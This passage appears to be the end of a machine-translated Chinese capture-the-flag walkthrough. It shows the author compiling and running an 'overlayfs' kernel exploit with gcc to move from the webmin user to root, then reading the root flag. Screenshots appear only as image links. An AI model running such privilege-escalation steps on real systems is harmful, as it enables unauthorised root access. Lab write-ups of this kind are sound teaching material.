paragraph-image"><div class="gh gi np"><img src="../Images/37901d22011deaff1d248a12b4d0e1c0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1386/format:webp/1*LDYu4bI1hwsfDsdFfTAO3g.png"/></div></figure><p id="8f34" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们将按照这些步骤成功编译漏洞并运行它以获得系统访问权限，</p><figure class="lj lk ll lm gt ly gh gi paragraph-image"><div class="gh gi nq"><img src="../Images/137411eab82063231d49dac0d0f10a37.png" data-original-src="https://miro.medium.com/v2/resize:fit:1376/format:webp/1*SRCnJpDBvTANqVVKxdYLQQ.png"/></div></figure><p id="b205" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在，让我们使用<strong class="jp ir"> gcc </strong>编译器来编译这个漏洞，</p><pre class="lj lk ll lm gt ln li lo lp aw lq bi"><span id="b2df" class="lr ls iq li b gy lt lu l lv lw">gcc overlayfs.c -o overlayfs</span></pre><p id="7b27" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们的利用将被编译。现在，让我们检查一下我们的漏洞是否被<code class="fe lf lg lh li b">ls -la</code>编译了，</p><figure class="lj lk ll lm gt ly gh gi paragraph-image"><div class="gh gi nr"><img src="../Images/4467837caf719b4a75638f4aba0d41ff.png" data-original-src="https://miro.medium.com/v2/resize:fit:1382/format:webp/1*yB_l5SVT80OT5l6ikp4G6w.png"/></div></figure><p id="2489" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">确实是！！现在，我们将检查我们的用户<code class="fe lf lg lh li b">id</code>(最后一次)，</p><figure class="lj lk ll lm gt ly gh gi paragraph-image"><div class="gh gi ns"><img src="../Images/a3304349cba185c3247ed4b7428b603f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1282/format:webp/1*KGdIpwPQREldei5Va8fX5w.png"/></div></figure><p id="d806" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们是webmin用户，现在让我们运行这个编译过漏洞，</p><pre class="lj lk ll lm gt ln li lo lp aw lq bi"><span id="4489" class="lr ls iq li b gy lt lu l lv lw">./overlayfs</span></pre><figure class="lj lk ll lm gt ly gh gi paragraph-image"><div class="gh gi nt"><img src="../Images/16a469aa02e306b1bedb40cfdba66f96.png" data-original-src="https://miro.medium.com/v2/resize:fit:1238/format:webp/1*7Jfkb7LooV0WEsAk9WBZ7Q.png"/></div></figure><p id="9308" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以进入系统了！！而我们可以通过发出<strong class="jp ir"> id </strong>命令来确认。</p><p id="c449" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">让我们导航到<strong class="jp ir"> /root </strong>目录并寻找标志，</p><pre class="lj lk ll lm gt ln li lo lp aw lq bi"><span id="dc60" class="lr ls iq li b gy lt lu l lv lw">cd /root ls -la</span></pre><figure class="lj lk ll lm gt ly gh gi paragraph-image"><div class="gh gi nu"><img src="../Images/aa0eda3a2bb19e9fcd01671f04cc4e6a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1352/format:webp/1*h7VGiLT7mObbQSGunZPtxw.png"/></div></figure><p id="f44b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">最后一项任务，让我们查看根标志的内容，</p><pre class="lj lk ll lm gt ln li lo lp aw lq bi"><span id="21fc" class="lr ls iq li b gy lt lu l lv lw">cat flag.txt</span></pre><figure class="lj lk ll lm gt ly gh gi paragraph-image"><div class="gh gi nv"><img src="../Images/6ab944db4a5b712283f738ba10db481f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1392/format:webp/1*FRpIY8P5-QrsF9_OnvyhjA.png"/></div></figure><p id="c39f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们已经成功利用了这个盒子。</p><p id="55a7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我希望你喜欢这篇文章，因为看完我写的东西后，我笑得很厉害。但和你们分享还是很好的。注意安全！再见。</p></div></div>    
</body>
</html>